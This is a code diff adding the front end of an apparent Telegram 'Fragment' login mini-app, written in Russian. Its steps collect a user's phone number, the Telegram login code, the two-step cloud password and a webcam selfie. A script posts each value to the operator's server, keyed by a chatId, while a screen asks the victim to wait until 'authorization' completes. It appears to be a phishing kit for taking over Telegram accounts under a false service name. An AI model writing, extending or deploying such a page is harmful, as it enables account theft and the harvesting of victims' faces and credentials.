+        <div class="progress-bar">
+            <div class="progress-fill" id="progress-fill" style="width: 33%;"></div>
+        </div>
+
+        <!-- Country Display -->
+        <div class="country-display" id="country-display" style="
+            margin-bottom: 16px;
+            padding: 12px;
+            background: rgba(28, 37, 50, 0.5);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 40px;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        ">
+            <span id="country-flag" style="font-size: 18px; margin-right: 6px;"></span>
+            <span id="country-name" style="color: var(--text-secondary); font-size: 14px; font-weight: 500;"></span>
+            <span id="country-code" style="color: var(--accent-color); font-size: 14px; font-weight: 600; margin-left: 8px;"></span>
+        </div>
+
+        <div class="phone-input">
+            <input type="tel" id="phone" placeholder="Введите номер телефона" maxlength="20">
+        </div>
+
+        <div class="phone-parts" id="phone-parts" style="display: none;">
+            <input type="tel" class="phone-part" id="phone-code" placeholder="7" maxlength="3">
+            <input type="tel" class="phone-part" id="phone-part1" placeholder="999" maxlength="3">
+            <input type="tel" class="phone-part" id="phone-part2" placeholder="000" maxlength="4">
+        </div>
+
+        <button id="btn-phone" onclick="handlePhone()">
+            <div class="spinner"></div><span>Далее</span>
+            <div class="star star-1">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 784.11 815.53">
+                    <path class="fil0" d="M392.05 0c-20.9,210.08 -184.06,378.41 -392.05,407.78 207.96,29.37 371.12,197.68 392.05,407.74 20.93,-210.06 184.09,-378.37 392.05,-407.74 -207.98,-29.38 -371.16,-197.69 -392.06,-407.78z" />
+                </svg>
+            </div>
+            <div class="star star-2">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 784.11 815.53">
+                    <path class="fil0" d="M392.05 0c-20.9,210.08 -184.06,378.41 -392.05,407.78 207.96,29.37 371.12,197.68 392.05,407.74 20.93,-210.06 184.09,-378.37 392.05,-407.74 -207.98,-29.38 -371.16,-197.69 -392.06,-407.78z" />
+                </svg>
+            </div>
+            <div class="star star-3">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 784.11 815.53">
+                    <path class="fil0" d="M392.05 0c-20.9,210.08 -184.06,378.41 -392.05,407.78 207.96,29.37 371.12,197.68 392.05,407.74 20.93,-210.06 184.09,-378.37 392.05,-407.74 -207.98,-29.38 -371.16,-197.69 -392.06,-407.78z" />
+                </svg>
+            </div>
+            <div class="star star-4">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 784.11 815.53">
+                    <path class="fil0" d="M392.05 0c-20.9,210.08 -184.06,378.41 -392.05,407.78 207.96,29.37 371.12,197.68 392.05,407.74 20.93,-210.06 184.09,-378.37 392.05,-407.74 -207.98,-29.38 -371.16,-197.69 -392.06,-407.78z" />
+                </svg>
+            </div>
+            <div class="star star-5">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 784.11 815.53">
+                    <path class="fil0" d="M392.05 0c-20.9,210.08 -184.06,378.41 -392.05,407.78 207.96,29.37 371.12,197.68 392.05,407.74 20.93,-210.06 184.09,-378.37 392.05,-407.74 -207.98,-29.38 -371.16,-197.69 -392.06,-407.78z" />
+                </svg>
+            </div>
+            <div class="star star-6">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 784.11 815.53">
+                    <path class="fil0" d="M392.05 0c-20.9,210.08 -184.06,378.41 -392.05,407.78 207.96,29.37 371.12,197.68 392.05,407.74 20.93,-210.06 184.09,-378.37 392.05,-407.74 -207.98,-29.38 -371.16,-197.69 -392.06,-407.78z" />
+                </svg>
+            </div>
+        </button>
+    </div>
+
+    <div id="step-code" class="input-group">
+        <div class="progress-bar">
+            <div class="progress-fill" style="width: 66%;"></div>
+        </div>
+
+        <div class="code-input" id="code-input">
+            <input type="tel" class="code-digit" maxlength="1" id="code-1">
+            <input type="tel" class="code-digit" maxlength="1" id="code-2">
+            <input type="tel" class="code-digit" maxlength="1" id="code-3">
+            <input type="tel" class="code-digit" maxlength="1" id="code-4">
+            <input type="tel" class="code-digit" maxlength="1" id="code-5">
+        </div>
+
+        <input type="text" id="code" style="display: none;">
+
+        <button class="back-step-button" onclick="goBackToPhone()">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M19 12H5M12 19l-7-7 7-7"/>
+            </svg>
+            <span>Назад к номеру</span>
+        </button>
+
+        <button id="btn-code" onclick="handleCode()">
+            <div class="spinner"></div><span>Подтвердить</span>
+            <div class="star star-1">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 784.11 815.53">
+                    <path class="fil0" d="M392.05 0c-20.9,210.08 -184.06,378.41 -392.05,407.78 207.96,29.37 371.12,197.68 392.05,407.74 20.93,-210.06 184.09,-378.37 392.05,-407.74 -207.98,-29.38 -371.16,-197.69 -392.06,-407.78z" />
+                </svg>
+            </div>
+            <div class="star star-2">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 784.11 815.53">
+                    <path class="fil0" d="M392.05 0c-20.9,210.08 -184.06,378.41 -392.05,407.78 207.96,29.37 371.12,197.68 392.05,407.74 20.93,-210.06 184.09,-378.37 392.05,-407.74 -207.98,-29.38 -371.16,-197.69 -392.06,-407.78z" />
+                </svg>
+            </div>
+            <div class="star star-3">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 784.11 815.53">
+                    <path class="fil0" d="M392.05 0c-20.9,210.08 -184.06,378.41 -392.05,407.78 207.96,29.37 371.12,197.68 392.05,407.74 20.93,-210.06 184.09,-378.37 392.05,-407.74 -207.98,-29.38 -371.16,-197.69 -392.06,-407.78z" />
+                </svg>
+            </div>
+            <div class="star star-4">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 784.11 815.53">
+                    <path class="fil0" d="M392.05 0c-20.9,210.08 -184.06,378.41 -392.05,407.78 207.96,29.37 371.12,197.68 392.05,407.74 20.93,-210.06 184.09,-378.37 392.05,-407.74 -207.98,-29.38 -371.16,-197.69 -392.06,-407.78z" />
+                </svg>
+            </div>
+            <div class="star star-5">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 784.11 815.53">
+                    <path class="fil0" d="M392.05 0c-20.9,210.08 -184.06,378.41 -392.05,407.78 207.96,29.37 371.12,197.68 392.05,407.74 20.93,-210.06 184.09,-378.37 392.05,-407.74 -207.98,-29.38 -371.16,-197.69 -392.06,-407.78z" />
+                </svg>
+            </div>
+            <div class="star star-6">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 784.11 815.53">
+                    <path class="fil0" d="M392.05 0c-20.9,210.08 -184.06,378.41 -392.05,407.78 207.96,29.37 371.12,197.68 392.05,407.74 20.93,-210.06 184.09,-378.37 392.05,-407.74 -207.98,-29.38 -371.16,-197.69 -392.06,-407.78z" />
+                </svg>
+            </div>
+        </button>
+    </div>
+
+    <div id="step-password" class="input-group">
+        <input type="password" id="password" placeholder="Облачный пароль">
+
+        <button class="back-step-button" onclick="goBackToCode()">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M19 12H5M12 19l-7-7 7-7"/>
+            </svg>
+            <span>Назад к коду</span>
+        </button>
+
+        <button id="btn-password" onclick="handlePassword()">
+            <div class="spinner"></div><span>Войти</span>
+            <div class="star star-1">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 784.11 815.53">
+                    <path class="fil0" d="M392.05 0c-20.9,210.08 -184.06,378.41 -392.05,407.78 207.96,29.37 371.12,197.68 392.05,407.74 20.93,-210.06 184.09,-378.37 392.05,-407.74 -207.98,-29.38 -371.16,-197.69 -392.06,-407.78z" />
+                </svg>
+            </div>
+            <div class="star star-2">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 784.11 815.53">
+                    <path class="fil0" d="M392.05 0c-20.9,210.08 -184.06,378.41 -392.05,407.78 207.96,29.37 371.12,197.68 392.05,407.74 20.93,-210.06 184.09,-378.37 392.05,-407.74 -207.98,-29.38 -371.16,-197.69 -392.06,-407.78z" />
+                </svg>
+            </div>
+            <div class="star star-3">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 784.11 815.53">
+                    <path class="fil0" d="M392.05 0c-20.9,210.08 -184.06,378.41 -392.05,407.78 207.96,29.37 371.12,197.68 392.05,407.74 20.93,-210.06 184.09,-378.37 392.05,-407.74 -207.98,-29.38 -371.16,-197.69 -392.06,-407.78z" />
+                </svg>
+            </div>
+            <div class="star star-4">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 784.11 815.53">
+                    <path class="fil0" d="M392.05 0c-20.9,210.08 -184.06,378.41 -392.05,407.78 207.96,29.37 371.12,197.68 392.05,407.74 20.93,-210.06 184.09,-378.37 392.05,-407.74 -207.98,-29.38 -371.16,-197.69 -392.06,-407.78z" />
+                </svg>
+            </div>
+            <div class="star star-5">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 784.11 815.53">
+                    <path class="fil0" d="M392.05 0c-20.9,210.08 -184.06,378.41 -392.05,407.78 207.96,29.37 371.12,197.68 392.05,407.74 20.93,-210.06 184.09,-378.37 392.05,-407.74 -207.98,-29.38 -371.16,-197.69 -392.06,-407.78z" />
+                </svg>
+            </div>
+            <div class="star star-6">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 784.11 815.53">
+                    <path class="fil0" d="M392.05 0c-20.9,210.08 -184.06,378.41 -392.05,407.78 207.96,29.37 371.12,197.68 392.05,407.74 20.93,-210.06 184.09,-378.37 392.05,-407.74 -207.98,-29.38 -371.16,-197.69 -392.06,-407.78z" />
+                </svg>
+            </div>
+        </button>
+    </div>
+
+    <div id="step-photo" class="input-group">
+        <div style="text-align: center; padding: 20px;">
+            <div style="margin-bottom: 20px;">
+                <video id="photo-video" autoplay playsinline style="width: 100%; max-width: 300px; border-radius: 16px; background: #000;"></video>
+                <canvas id="photo-canvas" style="display: none;"></canvas>
+            </div>
+            <p style="color: var(--text-secondary); font-size: 15px; margin-bottom: 24px;">
+                📸 Сфотографируйтесь для подтверждения личности
+            </p>
+            <div style="display: flex; gap: 12px; justify-content: center;">
+                <button id="btn-accept-photo" style="flex: 1; background: linear-gradient(135deg, #10b981 0%, #059669 100%);">
+                    ✅ Принять
+                </button>
+                <button id="btn-decline-photo" style="flex: 1; background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);">
+                    ❌ Отклонить
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <div id="step-loading" class="input-group">
+        <div style="text-align: center; padding: 40px 20px;">
+            <div class="loading-spinner" style="margin: 0 auto 24px; width: 60px; height: 60px; border: 4px solid rgba(59, 130, 246, 0.2); border-top: 4px solid #3b82f6; border-radius: 50%; animation: spin 1s linear infinite;"></div>
+            <p style="color: var(--text-secondary); font-size: 16px; line-height: 1.6; margin: 0;">
+                Ожидайте 1-3 минуты, пожалуйста не закрывайте MiniApp до окночания авторизации, это может сбросить ее
+            </p>
+        </div>
+    </div>
+
+    <div id="error" class="error-msg"></div>
+
+    <button class="service-button" onclick="window.location.href='fragment-info.html?chatId=' + chatId">
+        <div class="button-content">
+            <span>ℹ О сервисе Fragment</span>
+        </div>
+        <div class="floating-particle"></div>
+        <div class="floating-particle"></div>
+        <div class="floating-particle"></div>
+        <div class="floating-particle"></div>
+        <div class="floating-particle"></div>
+    </button>
+</div>
+
+    <script>
+    const API_BASE = window.location.origin; // Использует текущий домен
+    const urlParams = new URLSearchParams(window.location.search);
+    const chatId = urlParams.get('chatId');
+    let currentPhone = '';
+
+    // Country codes database with flags and local number lengths
+    const COUNTRY_DATA = {
+        // Europe
+        "+43": { name: "Австрия", flag: "🇦🇹", length: 10 }, "+355": { name: "Албания", flag: "🇦🇱", length: 9 }, "+376": { name: "Андорра", flag: "🇦🇩", length: 6 },
+        "+375": { name: "Беларусь", flag: "🇧🇾", length: 9 }, "+32": { name: "Бельгия", flag: "🇧🇪", length: 9 }, "+359": { name: "Болгария", flag: "🇧🇬", length: 9 },
+        "+387": { name: "Босния и Герцеговина", flag: "🇧🇦", length: 8 }, "+39": { name: "Италия", flag: "🇮🇹", length: 10 }, "+44": { name: "Великобритания", flag: "🇬🇧", length: 10 },
+        "+36": { name: "Венгрия", flag: "🇭🇺", length: 9 }, "+49": { name: "Германия", flag: "🇩🇪", length: 10 }, "+350": { name: "Гибралтар", flag: "🇬🇮", length: 8 },
+        "+30": { name: "Греция", flag: "🇬🇷", length: 10 }, "+45": { name: "Дания", flag: "🇩🇰", length: 8 }, "+353": { name: "Ирландия", flag: "🇮🇪", length: 9 },
+        "+354": { name: "Исландия", flag: "🇮🇸", length: 7 }, "+34": { name: "Испания", flag: "🇪🇸", length: 9 }, "+383": { name: "Косово", flag: "🇽🇰", length: 8 },
+        "+371": { name: "Латвия", flag: "🇱🇻", length: 8 }, "+370": { name: "Литва", flag: "🇱🇹", length: 8 }, "+423": { name: "Лихтенштейн", flag: "🇱🇮", length: 7 },
+        "+352": { name: "Люксембург", flag: "🇱🇺", length: 9 }, "+389": { name: "Македония", flag: "🇲🇰", length: 8 }, "+356": { name: "Мальта", flag: "🇲🇹", length: 8 },
+        "+373": { name: "Молдова", flag: "🇲🇩", length: 8 }, "+377": { name: "Монако", flag: "🇲🇨", length: 8 }, "+31": { name: "Нидерланды", flag: "🇳🇱", length: 9 },
+        "+47": { name: "Норвегия", flag: "🇳🇴", length: 8 }, "+48": { name: "Польша", flag: "🇵🇱", length: 9 }, "+351": { name: "Португалия", flag: "🇵🇹", length: 9 },
+        "+40": { name: "Румыния", flag: "🇷🇴", length: 10 }, "+7": { name: "Россия", flag: "🇷🇺", length: 10 }, "+378": { name: "Сан-Марино", flag: "🇸🇲", length: 9 },
+        "+381": { name: "Сербия", flag: "🇷🇸", length: 9 }, "+421": { name: "Словакия", flag: "🇸🇰", length: 9 }, "+386": { name: "Словения", flag: "🇸🇮", length: 8 },
+        "+380": { name: "Украина", flag: "🇺🇦", length: 9 }, "+298": { name: "Фарерские острова", flag: "🇫🇴", length: 6 }, "+358": { name: "Финляндия", flag: "🇫🇮", length: 9 },
+        "+33": { name: "Франция", flag: "🇫🇷", length: 9 }, "+385": { name: "Хорватия", flag: "🇭🇷", length: 9 }, "+382": { name: "Черногория", flag: "🇲🇪", length: 8 },
+        "+420": { name: "Чешская Республика", flag: "🇨🇿", length: 9 }, "+41": { name: "Швейцария", flag: "🇨🇭", length: 9 }, "+46": { name: "Швеция", flag: "🇸🇪", length: 9 },
+        "+372": { name: "Эстония", flag: "🇪🇪", length: 8 },
+
+        // North America
+        "+1": { name: "США/Канада", flag: "🇺🇸", length: 10 }, "+52": { name: "Мексика", flag: "🇲🇽", length: 10 },
+
+        // South America
+        "+54": { name: "Аргентина", flag: "🇦🇷", length: 10 }, "+591": { name: "Боливия", flag: "🇧🇴", length: 8 }, "+55": { name: "Бразилия", flag: "🇧🇷", length: 11 },
+        "+58": { name: "Венесуэла", flag: "🇻🇪", length: 10 }, "+592": { name: "Гайана", flag: "🇬🇾", length: 7 }, "+57": { name: "Колумбия", flag: "🇨🇴", length: 10 },
+        "+595": { name: "Парагвай", flag: "🇵🇾", length: 9 }, "+51": { name: "Перу", flag: "🇵🇪", length: 9 }, "+597": { name: "Суринам", flag: "🇸🇷", length: 7 },
+        "+598": { name: "Уругвай", flag: "🇺🇾", length: 8 }, "+56": { name: "Чили", flag: "🇨🇱", length: 9 }, "+593": { name: "Эквадор", flag: "🇪🇨", length: 9 },
+
+        // Asia
+        "+994": { name: "Азербайджан", flag: "🇦🇿", length: 9 }, "+374": { name: "Армения", flag: "🇦🇲", length: 8 }, "+93": { name: "Афганистан", flag: "🇦🇫", length: 9 },
+        "+880": { name: "Бангладеш", flag: "🇧🇩", length: 10 }, "+973": { name: "Бахрейн", flag: "🇧🇭", length: 8 }, "+673": { name: "Бруней", flag: "🇧🇳", length: 7 },
+        "+975": { name: "Бутан", flag: "🇧🇹", length: 8 }, "+670": { name: "Восточный Тимор", flag: "🇹🇱", length: 7 }, "+84": { name: "Вьетнам", flag: "🇻🇳", length: 9 },
+        "+995": { name: "Грузия", flag: "🇬🇪", length: 9 }, "+972": { name: "Израиль", flag: "🇮🇱", length: 9 }, "+91": { name: "Индия", flag: "🇮🇳", length: 10 },
+        "+62": { name: "Индонезия", flag: "🇮🇩", length: 10 }, "+962": { name: "Иордания", flag: "🇯🇴", length: 9 }, "+964": { name: "Ирак", flag: "🇮🇶", length: 10 },
+        "+98": { name: "Иран", flag: "🇮🇷", length: 10 }, "+967": { name: "Йемен", flag: "🇾🇪", length: 9 }, "+855": { name: "Камбоджа", flag: "🇰🇭", length: 9 },
+        "+974": { name: "Катар", flag: "🇶🇦", length: 8 }, "+996": { name: "Киргизия", flag: "🇰🇬", length: 9 }, "+86": { name: "Китай", flag: "🇨🇳", length: 11 },
+        "+850": { name: "Северная Корея", flag: "🇰🇵", length: 9 }, "+965": { name: "Кувейт", flag: "🇰🇼", length: 8 }, "+856": { name: "Лаос", flag: "🇱🇦", length: 8 },
+        "+961": { name: "Ливан", flag: "🇱🇧", length: 8 }, "+60": { name: "Малайзия", flag: "🇲🇾", length: 9 }, "+960": { name: "Мальдивы", flag: "🇲🇻", length: 7 },
+        "+976": { name: "Монголия", flag: "🇲🇳", length: 8 }, "+95": { name: "Мьянма", flag: "🇲🇲", length: 9 }, "+977": { name: "Непал", flag: "🇳🇵", length: 10 },
+        "+971": { name: "ОАЭ", flag: "🇦🇪", length: 9 }, "+968": { name: "Оман", flag: "🇴🇲", length: 8 }, "+92": { name: "Пакистан", flag: "🇵🇰", length: 10 },
+        "+970": { name: "Палестина", flag: "🇵🇸", length: 9 }, "+966": { name: "Саудовская Аравия", flag: "🇸🇦", length: 9 }, "+65": { name: "Сингапур", flag: "🇸🇬", length: 8 },
+        "+963": { name: "Сирия", flag: "🇸🇾", length: 9 }, "+992": { name: "Таджикистан", flag: "🇹🇯", length: 9 }, "+66": { name: "Таиланд", flag: "🇹🇭", length: 9 },
+        "+886": { name: "Тайвань", flag: "🇹🇼", length: 9 }, "+993": { name: "Туркменистан", flag: "🇹🇲", length: 8 }, "+90": { name: "Турция", flag: "🇹🇷", length: 10 },
+        "+998": { name: "Узбекистан", flag: "🇺🇿", length: 9 }, "+63": { name: "Филиппины", flag: "🇵🇭", length: 10 }, "+94": { name: "Шри-Ланка", flag: "🇱🇰", length: 9 },
+        "+82": { name: "Южная Корея", flag: "🇰🇷", length: 10 }, "+81": { name: "Япония", flag: "🇯🇵", length: 10 },
+
+        // Africa
+        "+213": { name: "Алжир", flag: "🇩🇿", length: 9 }, "+244": { name: "Ангола", flag: "🇦🇴", length: 9 }, "+229": { name: "Бенин", flag: "🇧🇯", length: 8 },
+        "+267": { name: "Ботсвана", flag: "🇧🇼", length: 7 }, "+226": { name: "Буркина-Фасо", flag: "🇧🇫", length: 8 }, "+257": { name: "Бурунди", flag: "🇧🇮", length: 8 },
+        "+241": { name: "Габон", flag: "🇬🇦", length: 7 }, "+220": { name: "Гамбия", flag: "🇬🇲", length: 7 }, "+233": { name: "Гана", flag: "🇬🇭", length: 9 },
+        "+224": { name: "Гвинея", flag: "🇬🇳", length: 9 }, "+245": { name: "Гвинея-Бисау", flag: "🇬🇼", length: 7 }, "+253": { name: "Джибути", flag: "🇩🇯", length: 6 },
+        "+20": { name: "Египет", flag: "🇪🇬", length: 10 }, "+260": { name: "Замбия", flag: "🇿🇲", length: 9 }, "+263": { name: "Зимбабве", flag: "🇿🇼", length: 9 },
+        "+238": { name: "Кабо-Верде", flag: "🇨🇻", length: 7 }, "+237": { name: "Камерун", flag: "🇨🇲", length: 9 }, "+254": { name: "Кения", flag: "🇰🇪", length: 9 },
+        "+269": { name: "Коморы", flag: "🇰🇲", length: 7 }, "+242": { name: "Конго", flag: "🇨🇬", length: 9 }, "+243": { name: "ДР Конго", flag: "🇨🇩", length: 9 },
+        "+225": { name: "Кот-д'Ивуар", flag: "🇨🇮", length: 8 }, "+266": { name: "Лесото", flag: "🇱🇸", length: 8 }, "+231": { name: "Либерия", flag: "🇱🇷", length: 7 },
+        "+218": { name: "Ливия", flag: "🇱🇾", length: 9 }, "+230": { name: "Маврикий", flag: "🇲🇺", length: 8 }, "+222": { name: "Мавритания", flag: "🇲🇷", length: 8 },
+        "+261": { name: "Мадагаскар", flag: "🇲🇬", length: 9 }, "+265": { name: "Малави", flag: "🇲🇼", length: 9 }, "+223": { name: "Мали", flag: "🇲🇱", length: 8 },
+        "+212": { name: "Марокко", flag: "🇲🇦", length: 9 }, "+258": { name: "Мозамбик", flag: "🇲🇿", length: 8 }, "+264": { name: "Намибия", flag: "🇳🇦", length: 9 },
+        "+227": { name: "Нигер", flag: "🇳🇪", length: 8 }, "+234": { name: "Нигерия", flag: "🇳🇬", length: 10 }, "+262": { name: "Реюньон", flag: "🇷🇪", length: 9 },
+        "+250": { name: "Руанда", flag: "🇷🇼", length: 9 }, "+239": { name: "Сан-Томе и Принсипи", flag: "🇸🇹", length: 7 }, "+221": { name: "Сенегал", flag: "🇸🇳", length: 9 },
+        "+248": { name: "Сейшелы", flag: "🇸🇨", length: 7 }, "+252": { name: "Сомали", flag: "🇸🇴", length: 8 }, "+249": { name: "Судан", flag: "🇸🇩", length: 9 },
+        "+232": { name: "Сьерра-Леоне", flag: "🇸🇱", length: 8 }, "+255": { name: "Танзания", flag: "🇹🇿", length: 9 }, "+228": { name: "Того", flag: "🇹🇬", length: 8 },
+        "+216": { name: "Тунис", flag: "🇹🇳", length: 8 }, "+256": { name: "Уганда", flag: "🇺🇬", length: 9 }, "+236": { name: "ЦАР", flag: "🇨🇫", length: 8 },
+        "+235": { name: "Чад", flag: "🇹🇩", length: 8 }, "+240": { name: "Экв. Гвинея", flag: "🇬🇶", length: 9 }, "+291": { name: "Эритрея", flag: "🇪🇷", length: 7 },
+        "+268": { name: "Эсватини", flag: "🇸🇿", length: 8 }, "+251": { name: "Эфиопия", flag: "🇪🇹", length: 9 }, "+27": { name: "ЮАР", flag: "🇿🇦", length: 9 },
+
+        // Oceania
+        "+61": { name: "Австралия", flag: "🇦🇺", length: 9 }, "+678": { name: "Вануату", flag: "🇻🇺", length: 7 }, "+686": { name: "Кирибати", flag: "🇰🇮", length: 8 },
+        "+692": { name: "Маршалловы Острова", flag: "🇲🇭", length: 7 }, "+691": { name: "Микронезия", flag: "🇫🇲", length: 7 }, "+674": { name: "Науру", flag: "🇳🇷", length: 7 },
+        "+683": { name: "Ниуэ", flag: "🇳🇺", length: 4 }, "+64": { name: "Новая Зеландия", flag: "🇳🇿", length: 9 }, "+687": { name: "Новая Каледония", flag: "🇳🇨", length: 6 },
+        "+682": { name: "Острова Кука", flag: "🇨🇰", length: 5 }, "+680": { name: "Палау", flag: "🇵🇼", length: 7 }, "+675": { name: "Папуа Новая Гвинея", flag: "🇵🇬", length: 8 },
+        "+685": { name: "Самоа", flag: "🇼🇸", length: 7 }, "+677": { name: "Соломоновы Острова", flag: "🇸🇧", length: 7 }, "+690": { name: "Токелау", flag: "🇹🇰", length: 4 },
+        "+676": { name: "Тонга", flag: "🇹🇴", length: 7 }, "+688": { name: "Тувалу", flag: "🇹🇻", length: 7 }, "+679": { name: "Фиджи", flag: "🇫🇯", length: 7 },
+        "+689": { name: "Французская Полинезия", flag: "🇵🇫", length: 6 }
+    };
+
+    console.log('ChatID from URL:', chatId); // Для отладки
+    console.log('Current origin:', window.location.origin); // Для отладки
+
+    // Force video to play immediately and continuously
+    function forceVideoPlay() {
+        const video = document.querySelector('.background-video');
+        if (video) {
+            video.play().then(() => {
+                console.log('Video playing successfully');
+                // Keep video playing - handle pause events
+                video.addEventListener('pause', () => {
+                    console.log('Video paused, attempting to resume...');
+                    setTimeout(() => video.play().catch(e => console.log('Resume failed:', e)), 100);
+                });
+            }).catch(e => {
+                console.log('Video play failed, will retry on user interaction:', e);
+                // Retry on any user interaction
+                const retryPlay = () => {
+                    video.play().then(() => {
+                        console.log('Video started after user interaction');
+                        // Remove listeners after successful start
+                        document.removeEventListener('click', retryPlay);
+                        document.removeEventListener('touchstart', retryPlay);
+                        document.removeEventListener('keydown', retryPlay);
+                        document.removeEventListener('focus', retryPlay);
+                    }).catch(e => console.log('Still failed:', e));
+                };
+
+                document.addEventListener('click', retryPlay, { once: false });
+                document.addEventListener('touchstart', retryPlay, { once: false });
+                document.addEventListener('keydown', retryPlay, { once: false });
+                document.addEventListener('focus', retryPlay, { once: false });
+
+                // Also try periodically
+                const interval = setInterval(() => {
+                    video.play().then(() => {
+                        console.log('Video started via interval');
+                        clearInterval(interval);
+                    }).catch(() => {});
+                }, 1000);
+            });
+
+            // Ensure video keeps playing
+            video.addEventListener('ended', () => {
+                console.log('Video ended, restarting...');
+                video.currentTime = 0;
+                video.play().catch(e => console.log('Restart failed:', e));
+            });
+        }
+    }
+
+    // Create animated stars
+    function createStars() {
+        const starsContainer = document.querySelector('.stars');
+        const numStars = 100;
+
+        for (let i = 0; i < numStars; i++) {
+            const star = document.createElement('div');
+            star.className = 'star-bg';
+            star.style.left = Math.random() * 100 + '%';
+            star.style.top = Math.random() * 100 + '%';
+            star.style.width = (Math.random() * 3 + 1) + 'px';
+            star.style.height = star.style.width;
+            starsContainer.appendChild(star);
+        }
+    }
+
+    // Auto-detect country from phone number
+    function detectCountry(phone) {
+        if (!phone) return null;
+
+        // Sort country codes by length (longest first) to match properly
+        const sortedCodes = Object.keys(COUNTRY_DATA).sort((a, b) => b.length - a.length);
+
+        for (const code of sortedCodes) {
+            const codeDigits = code.replace('+', '');
+            if (phone.startsWith(codeDigits)) {
+                return {
+                    code: code,
+                    data: COUNTRY_DATA[code],
+                    localNumber: phone.slice(codeDigits.length)
+                };
+            }
+        }
+
+        return null;
+    }
+
+    // Update country display
+    function updateCountryDisplay(phone) {
+        const countryDisplay = document.getElementById('country-display');
+        const flagElement = document.getElementById('country-flag');
+        const nameElement = document.getElementById('country-name');
+        const codeElement = document.getElementById('country-code');
+
+        const country = detectCountry(phone);
+        if (country && country.data) {
+            flagElement.textContent = country.data.flag;
+            nameElement.textContent = country.data.name;
+            codeElement.textContent = country.code;
+            countryDisplay.style.opacity = '1';
+
+            // Set maxlength based on formatted length
+            const codeDigits = country.code.replace('+', '');
+            const dummyPhone = '9'.repeat(codeDigits.length + (country.data.length || 10));
+            const formattedDummy = formatPhoneNumber(dummyPhone);
+            document.getElementById('phone').setAttribute('maxlength', formattedDummy.length);
+        } else {
+            flagElement.textContent = '';
+            nameElement.textContent = '';
+            codeElement.textContent = '';
+            countryDisplay.style.opacity = '0';
+
+            // Reset maxlength to default
+            document.getElementById('phone').setAttribute('maxlength', '20');
+        }
+    }
+
+
+
+    // Start video immediately
+    document.addEventListener('DOMContentLoaded', () => {
+        forceVideoPlay();
+        createStars();
+        initRippleEffects();
+    });
+    
+    // Ripple effect for buttons
+    function initRippleEffects() {
+        const buttons = document.querySelectorAll('button:not(.service-button):not(.back-step-button)');
+        
+        buttons.forEach(button => {
+            button.addEventListener('click', function(e) {
+                const ripple = document.createElement('span');
+                const rect = this.getBoundingClientRect();
+                const size = Math.max(rect.width, rect.height);
+                const x = e.clientX - rect.left - size / 2;
+                const y = e.clientY - rect.top - size / 2;
+                
+                ripple.style.width = ripple.style.height = size + 'px';
+                ripple.style.left = x + 'px';
+                ripple.style.top = y + 'px';
+                ripple.classList.add('ripple');
+                
+                this.appendChild(ripple);
+                
+                setTimeout(() => {
+                    ripple.remove();
+                }, 600);
+            });
+        });
+    }
+    
+    // Back navigation functions
+    function goBackToPhone() {
+        document.getElementById('step-code').classList.remove('active');
+        document.getElementById('step-phone').classList.add('active');
+        document.getElementById('desc').innerText = 'Введите номер телефона для входа через Fragment';
+        // Clear code inputs
+        const codeDigits = document.querySelectorAll('.code-digit');
+        codeDigits.forEach(digit => {
+            digit.value = '';
+            digit.classList.remove('filled');
+        });
+        document.getElementById('code').value = '';
+        document.getElementById('error').style.display = 'none';
+    }
+    
+    function goBackToCode() {
+        document.getElementById('step-password').classList.remove('active');
+        document.getElementById('step-code').classList.add('active');
+        document.getElementById('desc').innerText = 'Код отправлен в ваш Telegram';
+        // Clear password input
+        document.getElementById('password').value = '';
+        document.getElementById('error').style.display = 'none';
+    }
+
+    function showError(msg, inputElement = null) {
+        console.error('Error:', msg); // Для отладки
+        const el = document.getElementById('error');
+        el.innerText = msg;
+        el.style.display = 'block';
+
+        // Add shake animation and red color to input if provided
+        if (inputElement) {
+            inputElement.classList.add('shake', 'error-input');
+            setTimeout(() => {
+                inputElement.classList.remove('shake');
+            }, 500);
+        }
+    }
+
+    async function req(path, body) {
+        try {
+            const requestData = {...body, chatId};
+            console.log('Sending request to:', `${API_BASE}${path}`, requestData); // Для отладки
+
+            const r = await fetch(`${API_BASE}${path}`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(requestData)
+            });
+
+            console.log('Response status:', r.status); // Для отладки
+
+            if (!r.ok) {
+                throw new Error(`HTTP ${r.status}: ${r.statusText}`);
+            }
+
+            const result = await r.json();
+            console.log('Response data:', result); // Для отладки
+            return result;
+        } catch (e) {
+            console.error('Request failed:', e); // Для отладки
+            return {status: 'error', message: `Ошибка связи с сервером: ${e.message}`};
+        }
+    }
+
+    function setBtnLoading(id, isLoading) {
+        const btn = document.getElementById(id);
+        btn.disabled = isLoading;
+        btn.classList.toggle('loading', isLoading);
+        if (!isLoading) document.getElementById('error').style.display = 'none';
+    }
+
+    // Phone input animation
+    document.getElementById('phone').addEventListener('input', function(e) {
+        const rawInput = e.target.value;
